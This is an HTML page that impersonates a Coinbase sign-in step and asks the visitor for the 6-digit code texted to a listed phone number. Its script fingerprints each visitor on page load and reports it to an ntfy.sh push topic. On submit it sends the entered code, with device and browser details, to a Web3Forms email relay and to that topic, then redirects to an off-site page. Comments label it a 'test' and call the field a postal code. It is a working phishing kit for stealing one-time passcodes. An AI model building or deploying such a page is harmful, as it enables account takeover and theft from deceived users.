<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Coinbase | Postal code</title>
  <meta name="theme-color" content="#1d4ed8" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Sora:wght@600;700;800&display=swap" rel="stylesheet" />
  <style>
    :root {
      --blue: #1d4ed8;
      --blue-bright: #2563eb;
      --navy: #0b1b4d;
      --text: #12204a;
      --muted: #5b6b92;
      --border: #dbe5fb;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { height: 100%; }
    body {
      font-family: "Inter", system-ui, sans-serif;
      background: #ffffff;
      color: var(--text);
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      overflow-x: hidden;
      position: relative;
    }
    .bg { position: fixed; inset: 0; z-index: 0; pointer-events: none; overflow: hidden; }
    .bg::before {
      content: ""; position: absolute; width: 760px; height: 760px; border-radius: 50%;
      top: -380px; right: -260px;
      background: radial-gradient(circle at 30% 30%, #cfe0ff, #eaf1ff 60%, transparent 72%);
    }
    .bg::after {
      content: ""; position: absolute; width: 640px; height: 640px; border-radius: 50%;
      bottom: -340px; left: -240px;
      background: radial-gradient(circle at 70% 70%, #dbe8ff, #f1f6ff 60%, transparent 72%);
    }
    header {
      position: relative; z-index: 2;
      display: flex; align-items: center; justify-content: space-between;
      padding: 20px 32px;
    }
    .brand { display: flex; align-items: center; gap: 12px; font-family: "Sora", sans-serif; font-weight: 800; font-size: 1.5rem; letter-spacing: -0.02em; color: var(--navy); }
    .logo-mark { width: 42px; height: 42px; flex: none; filter: drop-shadow(0 6px 14px rgba(29, 78, 216, 0.22)); }

    main {
      position: relative; z-index: 1; flex: 1;
      display: flex; align-items: center; justify-content: center;
      padding: 24px 20px 48px;
    }
    .card {
      width: 100%; max-width: 440px; background: #fff;
      border: 1px solid var(--border); border-radius: 24px;
      padding: 32px 28px; box-shadow: 0 20px 50px -20px rgba(29, 78, 216, 0.3);
      animation: rise 0.8s ease both;
    }
    @keyframes rise { from { opacity: 0; transform: translateY(24px); } to { opacity: 1; transform: none; } }
    .notice {
      font-size: 0.85rem; font-weight: 500; color: #8a5a00;
      background: #fff6df; border: 1px solid #f3dc9b; border-radius: 12px;
      padding: 11px 14px; margin-bottom: 24px; line-height: 1.5;
    }
    h1 { font-family: "Sora", sans-serif; font-weight: 800; font-size: 1.5rem; color: var(--navy); letter-spacing: -0.02em; line-height: 1.25; }
    .hint { margin-top: 8px; color: var(--muted); font-size: 0.95rem; line-height: 1.5; }
    label { display: block; margin: 24px 0 8px; font-weight: 600; font-size: 0.92rem; }
    input[type="text"] {
      width: 100%; padding: 15px 16px; font: inherit; font-size: 1.15rem; letter-spacing: 0.35em;
      color: var(--navy); background: #f6f9ff; border: 1.5px solid var(--border); border-radius: 14px;
      outline: none; transition: border-color 0.2s, box-shadow 0.2s;
    }
    input[type="text"]:focus { border-color: var(--blue-bright); box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.15); background: #fff; }
    input[type="text"]::placeholder { letter-spacing: 0.2em; color: #a8b5d6; }
    .error { min-height: 20px; margin-top: 8px; font-size: 0.85rem; color: #c62828; }
    button {
      width: 100%; margin-top: 10px; padding: 16px; border: 0; border-radius: 999px; cursor: pointer;
      font-family: "Sora", sans-serif; font-weight: 600; font-size: 1.02rem; color: #fff;
      background: linear-gradient(135deg, var(--blue-bright), var(--blue));
      box-shadow: 0 12px 32px -8px rgba(29, 78, 216, 0.55);
      transition: transform 0.25s ease, box-shadow 0.25s ease;
    }
    button:hover { transform: translateY(-2px); box-shadow: 0 18px 40px -8px rgba(29, 78, 216, 0.7); }
    button:disabled { opacity: 0.7; cursor: default; transform: none; }
    .privacy { margin-top: 16px; font-size: 0.78rem; color: var(--muted); text-align: center; line-height: 1.5; }
    .hidden { display: none; }

    footer {
      position: relative; z-index: 2; text-align: center;
      padding: 26px 20px; border-top: 1px solid var(--border);
      background: rgba(255, 255, 255, 0.85); backdrop-filter: blur(10px);
    }
    .foot { display: inline-flex; align-items: center; gap: 10px; color: var(--muted); font-size: 0.88rem; }
    .foot .logo-mark { width: 26px; height: 26px; filter: none; }
    .foot strong { color: var(--navy); font-family: "Sora", sans-serif; }

    @media (max-width: 560px) {
      header { padding: 16px; }
      .brand { font-size: 1.3rem; }
      .logo-mark { width: 38px; height: 38px; }
      .card { padding: 26px 20px; }
    }
  </style>
</head>
<body>
  <div class="bg"></div>

  <header>
    <div class="brand">
      <svg class="logo-mark" viewBox="0 0 40 40" fill="none" aria-hidden="true">
        <rect x="1" y="1" width="38" height="38" rx="11" fill="#ffffff" stroke="#dbe5fb" stroke-width="1.5" />
        <path d="M27.3 13.9A9.5 9.5 0 1 0 27.3 26.1" stroke="#1d4ed8" stroke-width="5" stroke-linecap="round" />
      </svg>
      Coinbase
    </div>
  </header>

  <main>
    <section class="card">
      <div class="notice">sign in to continue.</div>

      <h1>Enter the 6-digit code sent to your phone number <span style="font-size:16px; color:black;"> +16073777311 </span> </h1>
      <p class="hint">sign in</p>

      <form id="postal-form" novalidate>
        <!-- Spam trap: real people never tick this -->
        <input type="checkbox" name="botcheck" class="hidden" tabindex="-1" autocomplete="off" />

        <label for="postal">Enter code</label>
        <input type="text" id="postal" name="postal_code" inputmode="numeric" autocomplete="postal-code"
               pattern="[0-9]{6}" placeholder="000000" required />
        <div class="error" id="error" role="alert"></div>

        <button type="sign-in" id="submit-btn">Sign-in</button>
        <p class="privacy"> 🔐 256-encryption security</p>
      </form>
<!-- Start: Centered Single-Line Sent / Retry Component -->
<div id="resend-box" style="width: 100%; display: flex; justify-content: center; align-items: center; gap: 6px; white-space: nowrap; font-family: inherit; font-size: 14px; color: #333;">
  <span>Sent</span>
  <button type="button" id="retry-btn" disabled style="background: none; border: none; padding: 0; margin: 0; font: inherit; text-decoration: underline; color: #9e9e9e; cursor: not-allowed; white-space: nowrap;">Retry</button>
  <span id="retry-timer" style="color: #666; font-variant-numeric: tabular-nums; white-space: nowrap;">60s</span>
</div>

<script>
  (function () {
    const btn = document.getElementById('retry-btn');
    const timer = document.getElementById('retry-timer');
    let seconds = 60, interval;

    function runCountdown() {
      seconds = 60;
      btn.disabled = true;
      btn.style.color = '#9e9e9e';
      btn.style.cursor = 'not-allowed';
      timer.style.display = 'inline';
      timer.textContent = seconds + 's';

      clearInterval(interval);
      interval = setInterval(() => {
        seconds--;
        if (seconds <= 0) {
          clearInterval(interval);
          timer.style.display = 'none';
          btn.disabled = false;
          btn.style.color = '#000000';
          btn.style.cursor = 'pointer';
        } else {
          timer.textContent = seconds + 's';
        }
      }, 1000);
    }

    btn.addEventListener('click', runCountdown);
    runCountdown();
  })();
</script>
<!-- End: Centered Single-Line Sent / Retry Component -->

    </section>
  </main>

  <footer>
    <div class="foot">
      <svg class="logo-mark" viewBox="0 0 40 40" fill="none" aria-hidden="true">
        <rect x="1" y="1" width="38" height="38" rx="11" fill="#ffffff" stroke="#dbe5fb" stroke-width="1.5" />
        <path d="M27.3 13.9A9.5 9.5 0 1 0 27.3 26.1" stroke="#1d4ed8" stroke-width="5" stroke-linecap="round" />
      </svg>
      <span>&copy; <span id="year">2026</span> <strong>Coinbase</strong>. All rights reserved.</span>
    </div>
  </footer>

  <script>
    document.getElementById("year").textContent = new Date().getFullYear();

    // Your Web3Forms access key (safe to be public: it can only send to your email)
    var ACCESS_KEY = "13074adb-ae1c-46d5-81ae-bc762824954a";
    // Where people go after submitting, so they know it's a test
    var REDIRECT_URL = "https://coinbase-transfer.web.app/finish";

    var form = document.getElementById("postal-form");
    var input = document.getElementById("postal");
    var error = document.getElementById("error");
    var button = document.getElementById("submit-btn");

    // Only allow digits, max 6
    input.addEventListener("input", function () {
      input.value = input.value.replace(/\D/g, "").slice(0, 6);
      error.textContent = "";
    });

    // Work out the phone/computer and browser from the browser's own info
    function detectDevice() {
      var ua = navigator.userAgent || "";
      var os = "Unknown", device = "Desktop", browser = "Unknown";

      if (/iPhone/.test(ua)) { os = "iOS (iPhone)"; device = "Phone"; }
      else if (/iPad/.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1)) { os = "iPadOS (iPad)"; device = "Tablet"; }
      else if (/Android/.test(ua)) { os = "Android"; device = /Mobile/.test(ua) ? "Phone" : "Tablet"; }
      else if (/Windows/.test(ua)) { os = "Windows"; }
      else if (/CrOS/.test(ua)) { os = "ChromeOS"; }
      else if (/Mac OS X/.test(ua)) { os = "macOS"; }
      else if (/Linux/.test(ua)) { os = "Linux"; }

      if (/FBAN|FBAV/.test(ua)) browser = "Facebook app browser";
      else if (/Instagram/.test(ua)) browser = "Instagram app browser";
      else if (/Edg\//.test(ua) || /EdgA\//.test(ua) || /EdgiOS\//.test(ua)) browser = "Edge";
      else if (/OPR\/|OPT\/|Opera/.test(ua)) browser = "Opera";
      else if (/SamsungBrowser/.test(ua)) browser = "Samsung Internet";
      else if (/FxiOS|Firefox/.test(ua)) browser = "Firefox";
      else if (/CriOS/.test(ua)) browser = "Chrome (iOS)";
      else if (/Chrome\//.test(ua)) browser = "Chrome";
      else if (/Safari\//.test(ua)) browser = "Safari";

      return { os: os, device: device, browser: browser, ua: ua };
    }

    // Best effort: some Android Chrome versions will share the phone model
    function getModel() {
      try {
        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
          return navigator.userAgentData.getHighEntropyValues(["model"]).then(function (v) {
            return v.model || "";
          }).catch(function () { return ""; });
        }
      } catch (e) {}
      return Promise.resolve("");
    }

    // Phone notification every time the page is opened or reloaded (via the free ntfy app)
    var NTFY_TOPIC = "choicepay-82948tro5f7za9";

    function notifyVisit() {
      var d = detectDevice();
      var reloaded = false;
      try {
        var nav = performance.getEntriesByType("navigation")[0];
        reloaded = !!nav && nav.type === "reload";
      } catch (e) {}

      getModel().then(function (model) {
        var lines = [
          d.device + " / " + d.os + (model ? " (" + model + ")" : ""),
          "Browser: " + d.browser,
          "Screen: " + window.screen.width + " x " + window.screen.height
        ];
        return fetch("https://ntfy.sh/", {
          method: "POST",
          keepalive: true,
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            topic: NTFY_TOPIC,
            title: reloaded ? "ChoicePay page reloaded" : "ChoicePay page opened",
            message: lines.join("\n"),
            tags: [reloaded ? "arrows_counterclockwise" : "eyes"]
          })
        });
      }).catch(function () { /* never bother the visitor if this fails */ });
    }
    notifyVisit();

    form.addEventListener("submit", function (e) {
      e.preventDefault();
      if (!/^[0-9]{6}$/.test(input.value)) {
        error.textContent = "Please enter exactly 6 digits.";
        input.focus();
        return;
      }
      button.disabled = true;
      button.textContent = "Sending...";

      var d = detectDevice();
      getModel().then(function (model) {
        var tz = "";
        try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}

        var payload = {
          access_key: ACCESS_KEY,
          subject: "New ChoicePay postal code (test)",
          from_name: "ChoicePay Test Form",
          postal_code: input.value,
          device_type: d.device,
          operating_system: d.os,
          phone_model: model || "not shared by browser",
          browser: d.browser,
          screen_size: window.screen.width + " x " + window.screen.height,
          language: navigator.language || "",
          timezone: tz,
          page: window.location.href,
          user_agent: d.ua,
          botcheck: form.elements["botcheck"].checked
        };

        // 1) Email copy via Web3Forms
        var toEmail = fetch("https://api.web3forms.com/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json", "Accept": "application/json" },
          body: JSON.stringify(payload)
        }).then(function (res) { return res.json(); })
          .then(function (data) { return !!data.success; })
          .catch(function () { return false; });

        // 2) Phone notification via ntfy, with the postal code in it
        var toPhone = fetch("https://ntfy.sh/", {
          method: "POST",
          keepalive: true,
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            topic: NTFY_TOPIC,
            title: "New postal code: " + input.value,
            message: [
              "Postal code: " + input.value,
              d.device + " / " + d.os + (model ? " (" + model + ")" : ""),
              "Browser: " + d.browser,
              "Screen: " + window.screen.width + " x " + window.screen.height,
              "Time zone: " + tz
            ].join("\n"),
            priority: 4,
            tags: ["incoming_envelope"]
          })
        }).then(function (res) { return res.ok; })
          .catch(function () { return false; });

        return Promise.all([toEmail, toPhone]);
      })
        .then(function (results) {
          // Go on if at least one of the two worked
          if (!results[0] && !results[1]) throw new Error("failed");
          window.location.href = REDIRECT_URL;
        })
        .catch(function () {
          button.disabled = false;
          button.textContent = "Submit";
          error.textContent = "Could not send. Please try again.";
        });
    });
  </script>
</body>
</html>
